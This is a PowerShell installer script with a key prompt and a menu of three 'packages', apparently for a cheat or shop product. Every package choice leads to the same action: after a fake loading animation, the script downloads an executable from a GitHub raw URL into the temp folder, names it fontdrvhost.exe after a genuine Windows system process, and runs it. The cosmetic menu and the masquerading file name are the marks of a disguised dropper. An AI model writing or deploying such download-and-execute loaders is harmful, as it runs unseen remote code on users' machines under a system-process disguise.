Clear-Host

# ===== CONFIG =====
$ValidKey = "smithshop"
$ExeURL = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$ExeOutput = "$env:TEMP\fontdrvhost.exe"

function Show-Loading($text) {
    for ($i = 0; $i -lt 30; $i++) {
        Write-Host -NoNewline "`r$text" + ("." * ($i % 6))
        Start-Sleep -Milliseconds 300
    }
    Write-Host ""
}

# ===== หน้าแรก =====
Write-Host "=== CMDSMITHSHOP :] ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

if ($choice -eq "1") {

    $userKey = Read-Host "Enter your Key"

    if ($userKey.Trim().ToLower() -eq $ValidKey.ToLower()) {

        # ✅ เคลียร์หลังใส่คีย์
        Clear-Host

        Write-Host "=== SELECT PACKAGE ===`n"
        Write-Host "1. smithx3d"
        Write-Host "2. uptoking"
        Write-Host "3. kingsmith"

        $package = Read-Host "Choose 1 / 2 / 3"

        switch ($package) {
            "1" { $pkgName = "smithx3d" }
            "2" { $pkgName = "uptoking" }
            "3" { $pkgName = "kingsmith" }
            default {
                Write-Host "❌ Invalid package!" -ForegroundColor Red
                Pause
                exit
            }
        }

        # ✅ เคลียร์หลังเลือกแพ็ก
        Clear-Host

        Write-Host "=== INSTALL MODE ===`n"

        # โหลด animation
        Show-Loading "install $pkgName "

        # โหลดไฟล์
        Invoke-WebRequest $ExeURL -OutFile $ExeOutput

        # รัน
        Start-Process $ExeOutput

        Write-Host "`n✅ install $pkgName success!" -ForegroundColor Green

    } else {
        Write-Host "❌ Key invalid!" -ForegroundColor Red
    }

}
elseif ($choice -eq "2") {

    Clear-Host
    Write-Host "=== CLEAN MODE ===`n"

    Show-Loading "cleaning "

    if (Test-Path $ExeOutput) {
        Remove-Item $ExeOutput -Force
        Write-Host "`nFile removed successfully ✅"
    } else {
        Write-Host "`nFile not found ⚠️"
    }

}
else {
    Write-Host "Invalid choice ⚠️"
}

Pause
